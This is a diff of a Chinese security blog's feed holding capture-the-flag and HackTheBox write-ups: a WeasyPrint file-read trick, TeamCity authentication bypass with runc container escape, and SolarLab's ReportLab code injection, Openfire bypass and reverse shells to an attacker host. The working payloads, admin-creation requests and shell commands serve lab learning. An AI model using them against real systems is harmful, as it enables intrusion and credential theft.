+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>
+
+<p>测试成功，我们在vps上开启监听看看</p>
+<p>获得信息<code>WeasyPrint 61.2</code></p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
+<p><strong>WeasyPrint</strong></p>
+<blockquote>
+<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
+</blockquote>
+<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
+<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
+<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回到题目，注意到源代码有个链接</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
+<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>
+
+<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
+<p>直接双写绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>
+
+<p>得到pdf文件后用binwalk分离一下，得到flag</p>
+<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Runner-HackTheBox</title>
+    <url>/article/Runner-HackTheBox.html</url>
+    <content><![CDATA[<p>JetBrains TeamCity 身份验证绕过漏洞、runC 逃逸漏洞</p>
+<span id="more"></span>
+
+<h1 id="Runner-HackTheBox"><a href="#Runner-HackTheBox" class="headerlink" title="Runner-HackTheBox"></a>Runner-HackTheBox</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.13</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">8000/tcp open  nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口发现重定向，添加到<code>/etc/hosts</code>后成功访问</p>
+<p>一番搜索没什么东西，扫一下目录和子域名</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518224235291.png"></p>
+<p>发现状态码为401，将该子域名添加到hosts文件，访问是登陆界面</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518224323364.png"></p>
+<p>扫一下目录</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518225531291.png"></p>
+<p>当我们访问<code>/404.html</code>的时候发现是JetBrains</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518225615781.png"></p>
+<p>由于是登陆界面，去网上找到篇文章是关于JetBrains TeamCity身份验证绕过的漏洞 <a href="https://forum.butian.net/share/2801">文章链接</a></p>
+<p>这里就不进行分析了，直接按照文章打exp</p>
+<p>获取用户列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx?jsp=/app/rest/users;.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240518230831965.png"></p>
+<p>可以看到存在四个用户</p>
+<p>我们添加管理员用户，payload如下（注意解析json数据）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;email&quot;: &quot;test@qq.com&quot;, &quot;roles&quot;: &#123;&quot;role&quot;: [&#123;&quot;roleId&quot;: &quot;SYSTEM_ADMIN&quot;, &quot;scope&quot;: &quot;g&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240518231558874.png"></p>
+<p>我们再查看下用户列表，发现添加test用户成功</p>
+<p><img src="/article/Runner-HackTheBox/image-20240518231657492.png"></p>
+<p>看漏洞是说有两种可以getshell，一种是上传插件另外一种是利用token绕过权限命令执行</p>
+<p>测试一下都没成功，正确解法是管理界面存在备份文件</p>
+<p><img src="/article/Runner-HackTheBox/image-20240519231605539.png"></p>
+<p>下载下来后，在users文件找到用户及密码</p>
+<p><img src="/article/Runner-HackTheBox/image-20240519231756558.png"></p>
+<p>john的密码爆破要很久，成功爆破用户matthew的密码<code>piper123</code></p>
+<p>不过这里</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520201810126.png"></p>
+<p>我们继续去找私钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rnw . -e &quot;BEGIN OPENSSH PRIVATE KEY&quot;</span><br></pre></td></tr></table></figure>
+
+<p>得到文件路径<code>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code></p>
+<p>我们使用cp命令放到我们当前文件夹，尝试ssh登陆发现刚好就是john的私钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa john@10.10.11.13</span><br></pre></td></tr></table></figure>
+
+<p>拿到user的flag，由于不知道john的密码，无法用sudo提权</p>
+<p>只能分析一下网络连接的端口情况</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -nltp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240520202711385.png"></p>
+<p>这里注意到9000端口是开放的，使用工具chisel搭建隧道把目标9000端口映射到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel client 10.10.14.60:6150 R:9000:127.0.0.1:9000  #R表示反向隧道</span><br></pre></td></tr></table></figure>
+
+<p>在本机开启监听6150端口，并执行反向连接，然后靶机主动去监听ip为10.10.14.60的本机并将9000端口映射到本机9000端口</p>
+<p>首先在本地开启http服务，然后传上去chisel</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.60:777/chisel</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Runner-HackTheBox/image-20240520204727134.png"></p>
+<p>然后就是在本机开启监听后，靶机上执行命令即可搭建隧道</p>
+<p>注意两个点</p>
+<ul>
+<li>第一就是本机kali上pip安装的和我们传上去的chisel版本会不一致，所以传哪个本机上就用哪个</li>
+<li>第二就是记得赋予可执行权限给chisel</li>
+</ul>
+<p><img src="/article/Runner-HackTheBox/image-20240520210045416.png"></p>
+<p>搭建隧道成功后访问本地9000端口，发现是登陆界面</p>
+<p>我们拿刚刚爆破得到的用户密码成功登陆</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520211026329.png"></p>
+<p>是个管理容器的平台，点击容器查看docker版本为25.03，对应runc版本1.0.0-rc93</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520212110157.png"></p>
+<p>此版本的runc存在容器逃逸漏洞 <a href="https://nitroc.org/posts/cve-2024-21626-illustrated/">参考文章</a></p>
+<p>根据参考文章，攻击者可通过以下两种方式利用该漏洞：</p>
+<ul>
+<li>启动一个容器时将容器的工作目录设置为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code>为打开 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录时返回的文件描述符，一般情况下为 7 或 8）。</li>
+<li>在容器中为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code> 为打开<code>/sys/fs/cgroup</code>目录时返回的文件描述符，一般情况下为 7 或 8） 创建一个符号链接。当外部在该容器中执行命令时，容器中可通过<code>/proc/&lt;PID&gt;/cwd</code>符号链接访问宿主机文件系统中的<code>/sys/fs/cgroup</code>目录，并利用形如<code>/proc/&lt;PID&gt;/cwd/../../../</code>的路径访问宿主机文件系统。</li>
+</ul>
+<p>我们先添加新的volume</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221407006.png"></p>
+<p>然后创建新容器</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221850313.png"></p>
+<p>修改工作目录</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221608215.png"></p>
+<p>注意要设置volume</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520221701687.png"></p>
+<p>创建好后，进入控制台填上root去连接</p>
+<p>成功得到root的flag</p>
+<p><img src="/article/Runner-HackTheBox/image-20240520220836933.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
@@ -1865,193 +1966,125 @@
       </tags>
   </entry>
   <entry>
-    <title>Runner-HackTheBox</title>
-    <url>/article/Runner-HackTheBox.html</url>
-    <content><![CDATA[<p>JetBrains TeamCity 身份验证绕过漏洞、runC 逃逸漏洞</p>
+    <title>SolarLab-HackTheBox</title>
+    <url>/article/SolarLab-HackTheBox.html</url>
+    <content><![CDATA[<p>SMB共享文件获取敏感信息、Python Reportlab 代码注入漏洞、Openfire身份认证绕过漏洞</p>
 <span id="more"></span>
 
-<h1 id="Runner-HackTheBox"><a href="#Runner-HackTheBox" class="headerlink" title="Runner-HackTheBox"></a>Runner-HackTheBox</h1><p><strong>信息搜集</strong></p>
+<h1 id="SolarLab-HackTheBox"><a href="#SolarLab-HackTheBox" class="headerlink" title="SolarLab-HackTheBox"></a>SolarLab-HackTheBox</h1><p><strong>信息搜集</strong></p>
 <p>nmap扫描端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.13</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.16</span><br></pre></td></tr></table></figure>
 
 <p>扫描结果如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">8000/tcp open  nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          nginx 1.24.0</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br></pre></td></tr></table></figure>
 
-<p>访问80端口发现重定向，添加到<code>/etc/hosts</code>后成功访问</p>
-<p>一番搜索没什么东西，扫一下目录和子域名</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518224235291.png"></p>
-<p>发现状态码为401，将该子域名添加到hosts文件，访问是登陆界面</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518224323364.png"></p>
-<p>扫一下目录</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518225531291.png"></p>
-<p>当我们访问<code>/404.html</code>的时候发现是JetBrains</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518225615781.png"></p>
-<p>由于是登陆界面，去网上找到篇文章是关于JetBrains TeamCity身份验证绕过的漏洞 <a href="https://forum.butian.net/share/2801">文章链接</a></p>
-<p>这里就不进行分析了，直接按照文章打exp</p>
-<p>获取用户列表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx?jsp=/app/rest/users;.jsp</span><br></pre></td></tr></table></figure>
+<p>观察到445端口开放存在Microsoft-DS服务，用smb查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L 10.10.11.16</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Runner-HackTheBox/image-20240518230831965.png"></p>
-<p>可以看到存在四个用户</p>
-<p>我们添加管理员用户，payload如下（注意解析json数据）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;email&quot;: &quot;test@qq.com&quot;, &quot;roles&quot;: &#123;&quot;role&quot;: [&#123;&quot;roleId&quot;: &quot;SYSTEM_ADMIN&quot;, &quot;scope&quot;: &quot;g&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602104226917.png"></p>
+<p>用Documents登录一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.11.16\\Documents</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Runner-HackTheBox/image-20240518231558874.png"></p>
-<p>我们再查看下用户列表，发现添加test用户成功</p>
-<p><img src="/article/Runner-HackTheBox/image-20240518231657492.png"></p>
-<p>看漏洞是说有两种可以getshell，一种是上传插件另外一种是利用token绕过权限命令执行</p>
-<p>测试一下都没成功，正确解法是管理界面存在备份文件</p>
-<p><img src="/article/Runner-HackTheBox/image-20240519231605539.png"></p>
-<p>下载下来后，在users文件找到用户及密码</p>
-<p><img src="/article/Runner-HackTheBox/image-20240519231756558.png"></p>
-<p>john的密码爆破要很久，成功爆破用户matthew的密码<code>piper123</code></p>
-<p>不过这里</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520201810126.png"></p>
-<p>我们继续去找私钥文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rnw . -e &quot;BEGIN OPENSSH PRIVATE KEY&quot;</span><br></pre></td></tr></table></figure>
+<p>我们注意到有个xlsx表格文件，使用get命令下载下来</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602114836534.png"></p>
+<p>打开看看发现有用户信息，应该能利用登录</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602114912532.png"></p>
+<p>访问80端口发现跳转域名，添加到hosts文件即可</p>
+<p>不过在扫描子域名以及目录后没有收获，尝试重新使用nmap扫描全部端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          nginx 1.24.0</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">6791/tcp open  http          nginx 1.24.0</span><br></pre></td></tr></table></figure>
 
-<p>得到文件路径<code>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code></p>
-<p>我们使用cp命令放到我们当前文件夹，尝试ssh登陆发现刚好就是john的私钥文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa john@10.10.11.13</span><br></pre></td></tr></table></figure>
+<p>还存在6791端口，访问发现跳转直接添加hosts文件即可</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602200358108.png"></p>
+<p>回到刚刚得到的用户信息，初步测试发现只有用户名为<code>AlexanderK</code>和<code>ClaudiaS</code>存在，并且使用密码登陆不成功</p>
+<p>但是我们注意到表格左上方有三个用户，其中<code>Blake</code>引起我们注意。并且用户登录的用户名的尾部是大写字母，我们尝试对其爆破出用户<code>Blake</code>的登录username</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602202614214.png"></p>
+<p>成功登录</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602202809085.png"></p>
+<p>大概翻了一下是和生成pdf文件有关，搜索一下ReportHub</p>
+<p>得知reportlab是一个用于生成PDF和图形的Python库，并且存在Python Reportlab 代码注入漏洞(CVE-2023-33733)</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602203427577.png"></p>
+<p>github上有写好的poc <a href="https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py">脚本链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;para&gt;</span><br><span class="line">              &lt;font color=&quot;[ [ getattr(pow,Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;whoami&#x27;) for Word in [orgTypeFun(&#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: False, &#x27;__eq__&#x27;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123;setattr(self, &#x27;mutated&#x27;, self.mutated - 1)&#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)) &#125;)] ] for orgTypeFun in [type(type(1))] ] and &#x27;red&#x27;&quot;&gt;</span><br><span class="line">                exploit</span><br><span class="line">                &lt;/font&gt;</span><br><span class="line">            &lt;/para&gt;</span><br></pre></td></tr></table></figure>
 
-<p>拿到user的flag，由于不知道john的密码，无法用sudo提权</p>
-<p>只能分析一下网络连接的端口情况</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -nltp</span><br></pre></td></tr></table></figure>
+<p>修改一下脚本中执行的命令为反弹shell，测试发现是windows系统，用在线网站生成powershell版本的shell <a href="https://zgao.top/reverse-shell/">网站链接</a></p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602204812175.png"></p>
+<p>随便选个request请求，抓包添加payload到<code>training_request</code>参数</p>
+<p>成功反弹shell</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602205810553.png"></p>
+<p>在<code>C:\Users\blake\Desktop</code>找到user的flag</p>
+<p>大概翻了一下没有什么可以利用的，我们查看下连接的端口情况</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Runner-HackTheBox/image-20240520202711385.png"></p>
-<p>这里注意到9000端口是开放的，使用工具chisel搭建隧道把目标9000端口映射到本地</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel client 10.10.14.60:6150 R:9000:127.0.0.1:9000  #R表示反向隧道</span><br></pre></td></tr></table></figure>
+<p>与常见端口漏洞利用对比，发现存在9090端口</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602213138305.png"></p>
+<p>我们利用chisel进行端口转发，把9090端口转发到我们本机</p>
+<p>（注意这里传的是windows版本的chisel，并且要用curl不知道wget为什么不行）</p>
+<p>在本地开启http服务，用curl去传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.88/chisel.exe -o chisel.exe</span><br></pre></td></tr></table></figure>
 
-<p>在本机开启监听6150端口，并执行反向连接，然后靶机主动去监听ip为10.10.14.60的本机并将9000端口映射到本机9000端口</p>
-<p>首先在本地开启http服务，然后传上去chisel</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.60:777/chisel</span><br></pre></td></tr></table></figure>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602214407604.png"></p>
+<p>进行隧道搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel.exe client 10.10.14.88:6150 R:9090:127.0.0.1:9090  #R表示反向隧道</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/Runner-HackTheBox/image-20240520204727134.png"></p>
-<p>然后就是在本机开启监听后，靶机上执行命令即可搭建隧道</p>
-<p>注意两个点</p>
-<ul>
-<li>第一就是本机kali上pip安装的和我们传上去的chisel版本会不一致，所以传哪个本机上就用哪个</li>
-<li>第二就是记得赋予可执行权限给chisel</li>
-</ul>
-<p><img src="/article/Runner-HackTheBox/image-20240520210045416.png"></p>
-<p>搭建隧道成功后访问本地9000端口，发现是登陆界面</p>
-<p>我们拿刚刚爆破得到的用户密码成功登陆</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520211026329.png"></p>
-<p>是个管理容器的平台，点击容器查看docker版本为25.03，对应runc版本1.0.0-rc93</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520212110157.png"></p>
-<p>此版本的runc存在容器逃逸漏洞 <a href="https://nitroc.org/posts/cve-2024-21626-illustrated/">参考文章</a></p>
-<p>根据参考文章，攻击者可通过以下两种方式利用该漏洞：</p>
-<ul>
-<li>启动一个容器时将容器的工作目录设置为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code>为打开 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录时返回的文件描述符，一般情况下为 7 或 8）。</li>
-<li>在容器中为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code> 为打开<code>/sys/fs/cgroup</code>目录时返回的文件描述符，一般情况下为 7 或 8） 创建一个符号链接。当外部在该容器中执行命令时，容器中可通过<code>/proc/&lt;PID&gt;/cwd</code>符号链接访问宿主机文件系统中的<code>/sys/fs/cgroup</code>目录，并利用形如<code>/proc/&lt;PID&gt;/cwd/../../../</code>的路径访问宿主机文件系统。</li>
-</ul>
-<p>我们先添加新的volume</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221407006.png"></p>
-<p>然后创建新容器</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221850313.png"></p>
-<p>修改工作目录</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221608215.png"></p>
-<p>注意要设置volume</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520221701687.png"></p>
-<p>创建好后，进入控制台填上root去连接</p>
-<p>成功得到root的flag</p>
-<p><img src="/article/Runner-HackTheBox/image-20240520220836933.png"></p>
+<p>访问<code>127.0.0.1:9090</code>，发现是版本为4.7.4的openfire</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602215037905.png"></p>
+<p>去阿里云漏洞库搜一下，找到Openfire身份认证绕过漏洞(CVE-2023-32315)</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602215156989.png"></p>
+<p>我们验证一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure>
+
+<p>成功访问日志</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602215809073.png"></p>
+<p>我们思路就是<strong>未授权</strong>创建管理员用户 <a href="https://zhuanlan.zhihu.com/p/675189543">参考文章</a></p>
+<p>首先获取<code>JSESSIONID</code>和<code>csrf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602220318246.png"></p>
+<p>使用获取到<code>JSESSIONID</code>和<code>csrf</code>创建用户<code>re1v1ve/rev1ve</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=SM0rG58cmPWkkiR&amp;username=rev1ve&amp;name=&amp;email=&amp;password=rev1ve&amp;passwordConfirm=admin123&amp;isadmin=on&amp;create=Create+User HTTP/1.1</span><br><span class="line">Host: x.x.x.x:9090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Cookie: JSESSIONID=node015oa6y9775tb54z36d9l36h8b7.node0;csrf=hXgFWkHO1HyB6Rb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602220512260.png"></p>
+<p>不过抛出异常了，还可以用github上的工具创建</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd CVE-2023-32315-Openfire-Bypass/scan_all</span><br><span class="line">go mod tidy</span><br><span class="line">go run main.go -u http://10.10.14.88:9090</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602224001586.png"></p>
+<p>成功登录</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602224737039.png"></p>
+<p>上传插件 <a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/tag/v0.1">插件链接</a></p>
+<p>在<code>server =&gt; server settings</code>功能处发现发现<code>shell Plugins</code></p>
+<p>按照上传插件的描述<code>pass 123</code>用密码123登录，找到命令执行界面</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602225153411.png"></p>
+<p>还是用powershell去弹shell</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602225847251.png"></p>
+<p>在<code>C:\Program Files\Openfire\embedded-db</code>发现<code>openfire.script</code>文件</p>
+<p>查看一下，发现插入的和admin有关数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO OFUSER VALUES(&#x27;admin&#x27;,&#x27;gjMoswpK+HakPdvLIvp6eLKlYh0=&#x27;,&#x27;9MwNQcJ9bF4YeyZDdns5gvXp620=&#x27;,&#x27;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#x27;,4096,NULL,&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;,&#x27;Administrator&#x27;,&#x27;admin@solarlab.htb&#x27;,&#x27;001700223740785&#x27;,&#x27;0&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>再看下对应表的键名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))</span><br></pre></td></tr></table></figure>
+
+<p>发现第7列对应的键值可能是凭证之类的，用github上的openfire工具后台管理密码解密 <a href="https://github.com/c0rdis/openfire_decrypt?tab=readme-ov-file">工具链接</a></p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602231518952.png"></p>
+<p>出现报错缺少passwordKey，往下翻翻找到</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602231610637.png"></p>
+<p>跑出来密码后，那么就可以切换administrator用户</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240602231639866.png"></p>
+<p>上传一下RunasCs用来用户切换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.88/RunasCs.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/SolarLab-HackTheBox/image-20240602232939862.png"></p>
+<p>用powershell弹到本地1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RunasCs.exe administrator ThisPasswordShouldDo!@ powershell.exe -r 10.10.14.88:1234</span><br></pre></td></tr></table></figure>
+
+<p>成功切换administrator用户拿到root的flag</p>
+<p><img src="/article/SolarLab-HackTheBox/image-20240603000137332.png"></p>
 ]]></content>
       <categories>
         <category>渗透</category>
       </categories>
       <tags>
         <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Surveillance-HackTheBox</title>
-    <url>/article/Surveillance-HackTheBox.html</url>
-    <content><![CDATA[<p>CVE-2023-41892、CVE-2023-26035</p>
-<span id="more"></span>
-
-<h1 id="Surveillance-HackTheBox"><a href="#Surveillance-HackTheBox" class="headerlink" title="Surveillance-HackTheBox"></a>Surveillance-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.245</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Surveillance-HackTheBox/image-20240111180818681.png"></p>
